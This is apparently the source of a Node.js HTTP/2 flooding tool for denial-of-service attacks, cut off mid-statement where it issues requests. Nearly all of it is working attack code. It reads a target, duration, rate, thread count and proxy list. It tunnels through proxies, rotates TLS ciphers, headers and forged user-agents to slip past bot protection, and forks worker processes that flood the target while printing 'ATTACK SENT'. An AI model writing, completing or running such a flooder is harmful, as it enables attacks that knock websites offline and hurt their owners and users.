const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const os = require("os");
const colors = require("colors");
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");
const accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  ],

  cache_header = [
    'max-age=0',
    'no-cache',
    'no-store',
    'pre-check=0',
    'post-check=0',
    'must-revalidate',
    'proxy-revalidate',
    's-maxage=604800',
    'no-cache, no-store,private, max-age=0, must-revalidate',
    'no-cache, no-store,private, s-maxage=604800, must-revalidate',
    'no-cache, no-store,private, max-age=604800, must-revalidate',
  ]
language_header = [
    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
    'en-US,en;q=0.5',
    'en-US,en;q=0.9',
    'de-CH;q=0.7',
    'da, en-gb;q=0.8, en;q=0.7',
    'cs;q=0.5',
    'nl-NL,nl;q=0.9',
    'nn-NO,nn;q=0.9',
    'or-IN,or;q=0.9',
    'pa-IN,pa;q=0.9',
    'pl-PL,pl;q=0.9',
    'pt-BR,pt;q=0.9',
    'pt-PT,pt;q=0.9',
    'ro-RO,ro;q=0.9',
    'ru-RU,ru;q=0.9',
    'si-LK,si;q=0.9',
    'sk-SK,sk;q=0.9',
    'sl-SI,sl;q=0.9',
    'sq-AL,sq;q=0.9',
    'sr-Cyrl-RS,sr;q=0.9',
    'sr-Latn-RS,sr;q=0.9',
    'sv-SE,sv;q=0.9',
    'sw-KE,sw;q=0.9',
    'ta-IN,ta;q=0.9',
    'te-IN,te;q=0.9',
    'th-TH,th;q=0.9',
    'tr-TR,tr;q=0.9',
    'uk-UA,uk;q=0.9',
    'ur-PK,ur;q=0.9',
    'uz-Latn-UZ,uz;q=0.9',
    'vi-VN,vi;q=0.9',
    'zh-CN,zh;q=0.9',
    'zh-HK,zh;q=0.9',
    'zh-TW,zh;q=0.9',
    'am-ET,am;q=0.8',
    'as-IN,as;q=0.8',
    'az-Cyrl-AZ,az;q=0.8',
    'bn-BD,bn;q=0.8',
    'bs-Cyrl-BA,bs;q=0.8',
    'bs-Latn-BA,bs;q=0.8',
    'dz-BT,dz;q=0.8',
    'fil-PH,fil;q=0.8',
    'fr-CA,fr;q=0.8',
    'fr-CH,fr;q=0.8',
    'fr-BE,fr;q=0.8',
    'fr-LU,fr;q=0.8',
    'gsw-CH,gsw;q=0.8',
    'ha-Latn-NG,ha;q=0.8',
    'hr-BA,hr;q=0.8',
    'ig-NG,ig;q=0.8',
    'ii-CN,ii;q=0.8',
    'is-IS,is;q=0.8',
    'jv-Latn-ID,jv;q=0.8',
    'ka-GE,ka;q=0.8',
    'kkj-CM,kkj;q=0.8',
    'kl-GL,kl;q=0.8',
    'km-KH,km;q=0.8',
    'kok-IN,kok;q=0.8',
    'ks-Arab-IN,ks;q=0.8',
    'lb-LU,lb;q=0.8',
    'ln-CG,ln;q=0.8',
    'mn-Mong-CN,mn;q=0.8',
    'mr-MN,mr;q=0.8',
    'ms-BN,ms;q=0.8',
    'mt-MT,mt;q=0.8',
    'mua-CM,mua;q=0.8',
    'nds-DE,nds;q=0.8',
    'ne-IN,ne;q=0.8',
    'nso-ZA,nso;q=0.8',
    'oc-FR,oc;q=0.8',
    'pa-Arab-PK,pa;q=0.8',
    'ps-AF,ps;q=0.8',
    'quz-BO,quz;q=0.8',
    'quz-EC,quz;q=0.8',
    'quz-PE,quz;q=0.8',
    'rm-CH,rm;q=0.8',
    'rw-RW,rw;q=0.8',
    'sd-Arab-PK,sd;q=0.8',
    'se-NO,se;q=0.8',
    'si-LK,si;q=0.8',
    'smn-FI,smn;q=0.8',
    'sms-FI,sms;q=0.8',
    'syr-SY,syr;q=0.8',
    'tg-Cyrl-TJ,tg;q=0.8',
    'ti-ER,ti;q=0.8',
    'tk-TM,tk;q=0.8',
    'tn-ZA,tn;q=0.8',
    'ug-CN,ug;q=0.8',
    'uz-Cyrl-UZ,uz;q=0.8',
    've-ZA,ve;q=0.8',
    'wo-SN,wo;q=0.8',
    'xh-ZA,xh;q=0.8',
    'yo-NG,yo;q=0.8',
    'zgh-MA,zgh;q=0.8',
    'zu-ZA,zu;q=0.8',
  ];
  const fetch_site = [
    "same-origin"
    , "same-site"
    , "cross-site"
    , "none"
  ];
  const fetch_mode = [
    "navigate"
    , "same-origin"
    , "no-cors"
    , "cors"
  , ];
  const fetch_dest = [
    "document"
    , "sharedworker"
    , "subresource"
    , "unknown"
    , "worker", ];
    const cplist = [
    'ECDHE-ECDSA-AES128-GCM-SHA256:HIGH:MEDIUM:3DES',
    'ECDHE-ECDSA-AES128-SHA256:HIGH:MEDIUM:3DES',
    'ECDHE-ECDSA-AES128-SHA:HIGH:MEDIUM:3DES',
    'ECDHE-ECDSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES',
    'ECDHE-ECDSA-AES256-SHA384:HIGH:MEDIUM:3DES',
    'ECDHE-ECDSA-AES256-SHA:HIGH:MEDIUM:3DES',
    'ECDHE-ECDSA-CHACHA20-POLY1305-OLD:HIGH:MEDIUM:3DES',
     'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
 'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
 "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
 "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
 "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
 "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
 "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
 "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
 'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
 'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
 'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
 'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
 'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
 "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
 "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
 "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
 "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
 "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
 "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
 'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
 'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
 'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
 'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
 ':ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
 'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
 'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
 ];
 var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
  process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 const sigalgs = [
    'ecdsa_secp256r1_sha256',
    'ecdsa_secp384r1_sha384',
    'ecdsa_secp521r1_sha512',
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512',
]
  let SignalsList = sigalgs.join(':')
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";
const secureOptions =
 crypto.constants.SSL_OP_NO_SSLv2 |
 crypto.constants.SSL_OP_NO_SSLv3 |
 crypto.constants.SSL_OP_NO_TLSv1 |
 crypto.constants.SSL_OP_NO_TLSv1_1 |
 crypto.constants.SSL_OP_NO_TLSv1_3 |
 crypto.constants.ALPN_ENABLED |
 crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
 crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
 crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
 crypto.constants.SSL_OP_COOKIE_EXCHANGE |
 crypto.constants.SSL_OP_PKCS1_CHECK_1 |
 crypto.constants.SSL_OP_PKCS1_CHECK_2 |
 crypto.constants.SSL_OP_SINGLE_DH_USE |
 crypto.constants.SSL_OP_SINGLE_ECDH_USE |
 crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
 if (process.argv.length < 7){console.log(`Usage: host time req thread proxy.txt`); process.exit();}
 const secureProtocol = "TLS_method";
 const headers = {};

 const secureContextOptions = {
     ciphers: ciphers,
     sigalgs: SignalsList,
     honorCipherOrder: true,
     secureOptions: secureOptions,
     secureProtocol: secureProtocol
 };

 const secureContext = tls.createSecureContext(secureContextOptions);
 const args = {
     target: process.argv[2],
     time: ~~process.argv[3],
     Rate: ~~process.argv[4],
     threads: ~~process.argv[5],
     proxyFile: process.argv[6]
 }
 var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target);

 if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
    console.clear()
    console.log("ATTACK SENT ".bgRed);
    process.stdout.write("Loading: 10%\n".blue);
setTimeout(() => {
  process.stdout.write("\rLoading: 50%\n".blue);
}, 500 * process.argv[3] );

setTimeout(() => {
  process.stdout.write("\rLoading: 100%\n".blue);
}, process.argv[3] * 1000);
        cluster.fork();

    }
} else {for (let i = 0; i < args.Rate; i++) 
    { setInterval(runFlooder) }}


 class NetSocket {
     constructor(){}

  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n"; //Keep Alive
     const buffer = new Buffer.from(payload);
     const connection = net.connect({
        host: options.host,
        port: options.port,
    });

    connection.setTimeout(options.timeout * 600000);
    connection.setKeepAlive(true, 600000);
    connection.setNoDelay(true)
    connection.on("connect", () => {
       connection.write(buffer);
   });

   connection.on("data", chunk => {
       const response = chunk.toString("utf-8");
       const isAlive = response.includes("HTTP/1.1 200");
       if (isAlive === false) {
           connection.destroy();
           return callback(undefined, "error: invalid response from proxy server");
       }
       return callback(connection, undefined);
   });

   connection.on("timeout", () => {
       connection.destroy();
       return callback(undefined, "error: timeout exceeded");
   });

}
}
function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}


 const Socker = new NetSocket();

 function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 function getRandomValue(arr) {
    const randomIndex = Math.floor(Math.random() * arr.length);
    return arr[randomIndex];
  }
  function randstra(length) {
const characters = "0123456789";
let result = "";
const charactersLength = characters.length;
for (let i = 0; i < length; i++) {
result += characters.charAt(Math.floor(Math.random() * charactersLength));
}
return result;
}

 function randomIntn(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}const jalist = [
  "002205d0f96c37c5e660b9f041363c1",
  "073eede15b2a5a0302d823ecbd5ad15b",
  "0b61c673ee71fe9ee725bd687c455809",
  "6cd1b944f5885e2cfbe98a840b75eeb8",
  "94c485bca29d5392be53f2b8cf7f4304",
  "b4f4e6164f938870486578536fc1ffce",
  "b8f81673c0e1d29908346f3bab892b9b",
  "baaac9b6bf25ad098115c71c59d29e51",
  "bc6c386f480ee97b9d9e52d472b772d8",
  "da949afd9bd6df820730f8f171584a71",
  "f58966d34ff9488a83797b55c804724d",
  "fd6314b03413399e4f23d1524d206692",
  "0a81538cf247c104edb677bdb8902ed5",
  "0b6592fd91d4843c823b75e49b43838d",
  "0ffee3ba8e615ad22535e7f771690a28",
  "1c15aca4a38bad90f9c40678f6aface9",
  "5163bc7c08f57077bc652ec370459c2f",
  "a88f1426c4603f2a8cd8bb41e875cb75",
  "b03910cc6de801d2fcfa0c3b9f397df4",
  "bfcc1a3891601edb4f137ab7ab25b840",
  "ce694315cbb81ce95e6ae4ae8cbafde6",
  "f15797a734d0b4f171a86fd35c9a5e43"
 ];
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 }
 function randstrs(length) {
    const characters = "0123456789";
    const charactersLength = characters.length;
    const randomBytes = crypto.randomBytes(length);
    let result = "";
    for (let i = 0; i < length; i++) {
        const randomIndex = randomBytes[i] % charactersLength;
        result += characters.charAt(randomIndex);
    }
    return result;
}
const randstrsValue = randstrs(10);
  function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";
    const nm = [
      "110.0.0.0",
      "111.0.0.0",
      "112.0.0.0",
      "113.0.0.0",
      "114.0.0.0",
      "115.0.0.0",
      "116.0.0.0",
      "117.0.0.0",
      "118.0.0.0",
      "119.0.0.0",
      ];
      const nmx = [
      "120.0",
      "119.0",
      "118.0",
      "117.0",
      "116.0",
      "115.0",
      "114.0",
      "113.0",
      "112.0",
      "111.0",
      ];
      const nmx1 = [
      "105.0.0.0",
      "104.0.0.0",
      "103.0.0.0",
      "102.0.0.0",
      "101.0.0.0",
      "100.0.0.0",
      "99.0.0.0",
      "98.0.0.0",
      "97.0.0.0",
      ];
      const sysos = [
      "Windows 1.01",
      "Windows 1.02",
      "Windows 1.03",
      "Windows 1.04",
      "Windows 2.01",
      "Windows 3.0",
      "Windows NT 3.1",
      "Windows NT 3.5",
      "Windows 95",
      "Windows 98",
      "Windows 2006",
      "Windows NT 4.0",
      "Windows 95 Edition",
      "Windows 98 Edition",
      "Windows Me",
      "Windows Business",
      "Windows XP",
      "Windows 7",
      "Windows 8",
      "Windows 10 version 1507",
      "Windows 10 version 1511",
      "Windows 10 version 1607",
      "Windows 10 version 1703",
      ];
      const winarch = [
      "x86-16",
      "x86-16, IA32",
      "IA-32",
      "IA-32, Alpha, MIPS",
      "IA-32, Alpha, MIPS, PowerPC",
      "Itanium",
      "x86_64",
      "IA-32, x86-64",
      "IA-32, x86-64, ARM64",
      "x86-64, ARM64",
      "ARMv4, MIPS, SH-3",
      "ARMv4",
      "ARMv5",
      "ARMv7",
      "IA-32, x86-64, Itanium",
      "IA-32, x86-64, Itanium",
      "x86-64, Itanium",
      ];
      const winch = [
      "2012 R2",
      "2019 R2",
      "2012 R2 Datacenter",
      "Server Blue",
      "Longhorn Server",
      "Whistler Server",
      "Shell Release",
      "Daytona",
      "Razzle",
      "HPC 2008",
      ];
      
       var nm1 = nm[Math.floor(Math.floor(Math.random() * nm.length))];
       var nm2 = sysos[Math.floor(Math.floor(Math.random() * sysos.length))];
       var nm3 = winarch[Math.floor(Math.floor(Math.random() * winarch.length))];
       var nm4 = nmx[Math.floor(Math.floor(Math.random() * nmx.length))];
       var nm5 = winch[Math.floor(Math.floor(Math.random() * winch.length))];
       var nm6 = nmx1[Math.floor(Math.floor(Math.random() * nmx1.length))];
        const rd = [
          "221988",
          "1287172",
          "87238723",
          "8737283",
          "8238232",
          "63535464",
          "121212",
        ];
         var kha = rd[Math.floor(Math.floor(Math.random() * rd.length))];
         
  encoding_header = [
    'gzip, deflate, br'
    , 'compress, gzip'
    , 'deflate, gzip'
    , 'gzip, identity'
  ];
  function randstrr(length) {
                const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
                let result = "";
                const charactersLength = characters.length;
                for (let i = 0; i < length; i++) {
                        result += characters.charAt(Math.floor(Math.random() * charactersLength));
                }
                return result;
        }
    function randstr(length) {
                const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
                let result = "";
                const charactersLength = characters.length;
                for (let i = 0; i < length; i++) {
                        result += characters.charAt(Math.floor(Math.random() * charactersLength));
                }
                return result;
        }
  function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
 const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
 const randomStringArray = Array.from({ length }, () => {
   const randomIndex = Math.floor(Math.random() * characters.length);
   return characters[randomIndex];
 });

 return randomStringArray.join('');
}
 const val = { 'NEl': JSON.stringify({
                        "report_to": Math.random() < 0.5 ? "cf-nel" : 'default',
                        "max-age": Math.random() < 0.5 ? 604800 : 2561000,
                        "include_subdomains": Math.random() < 0.5 ? true : false}),
            }

     const rateHeaders = [
        {"accept" :accept_header[Math.floor(Math.random() * accept_header.length)]},
        {"Access-Control-Request-Method": "GET"},
        { "accept-language" : language_header[Math.floor(Math.random() * language_header.length)]},
        { "origin": "https://" + parsedTarget.host},
        { "source-ip": randstr(5)  },
        //{"x-aspnet-version" : randstrsValue},
        {"NEL" : val},
        { "A-IM": "Feed" },
        {'Accept-Range': Math.random() < 0.5 ? 'bytes' : 'none'},
       {'Delta-Base' : '12340001'},
       {"te": "trailers"},
       {"accept-language": "vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3"},
        { "data-return" :"false"},
];
let headers = {
  ":authority": parsedTarget.host,
  ":scheme": "https",
  ":path": parsedTarget.path + "?" + randstr(3) + "=" +generateRandomString(10,25),
  ":method": "GET",
  "upgrade-insecure-requests" : "1",
  "Sec-Fetch-User" : "?1",
  "accept-encoding" : encoding_header[Math.floor(Math.random() * encoding_header.length)],
  "cache-control": cache_header[Math.floor(Math.random() * cache_header.length)],
  "sec-fetch-mode": fetch_mode[Math.floor(Math.random() * fetch_mode.length)],
  "sec-fetch-site": fetch_site[Math.floor(Math.random() * fetch_site.length)],
  "sec-fetch-dest": fetch_dest[Math.floor(Math.random() * fetch_dest.length)],
  "user-agent" : generateRandomString(3,8) + "/5.0 (" + nm2 + "; " + nm5 + "; " + nm3 + " ; " + kha +" " + nm4 + ") /Gecko/20100101 Edg/91.0.864.59 " + nm4,
}

 const proxyOptions = {
     host: parsedProxy[0],
     port: ~~parsedProxy[1],
     address: parsedTarget.host + ":443",
     timeout: 10
 };
 Socker.HTTP(proxyOptions, (connection, error) => {
    if (error) return

    connection.setKeepAlive(true, 600000);
    connection.setNoDelay(true)

    const settings = {
       enablePush: false,
       initialWindowSize: 15564991,
   };



    const tlsOptions = {
       port: parsedPort,
       secure: true,
       ALPNProtocols: ["h2"],
       ciphers: cipper,
       sigalgs: sigalgs,
       requestCert: true,
       socket: connection,
       ecdhCurve: ecdhCurve,
       honorCipherOrder: false,
       rejectUnauthorized: false,
       secureOptions: secureOptions,
       secureContext :secureContext,
       host : parsedTarget.host,
       servername: parsedTarget.host,
       secureProtocol: secureProtocol
   };
    const tlsConn = tls.connect(parsedPort, parsedTarget.host, tlsOptions);

    tlsConn.allowHalfOpen = true;
    tlsConn.setNoDelay(true);
    tlsConn.setKeepAlive(true, 600000);
    tlsConn.setMaxListeners(0);

    const client = http2.connect(parsedTarget.href, {
      settings: {
     headerTableSize: 65536,
     initialWindowSize: 6291456,
     maxFrameSize: 16384,
   },
      createConnection: () => tlsConn,
      socket: connection,
  });

  client.settings({
     headerTableSize: 65536,
     initialWindowSize: 6291456,
     maxFrameSize: 16384,
   });

client.setMaxListeners(0);
client.settings(settings);
    client.on("connect", () => {
       const IntervalAttack = setInterval(() => {
           for (let i = 0; i < args.Rate; i++) {

            const dynHeaders = {
              ...headers,
              ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
            }


const request = client.request({
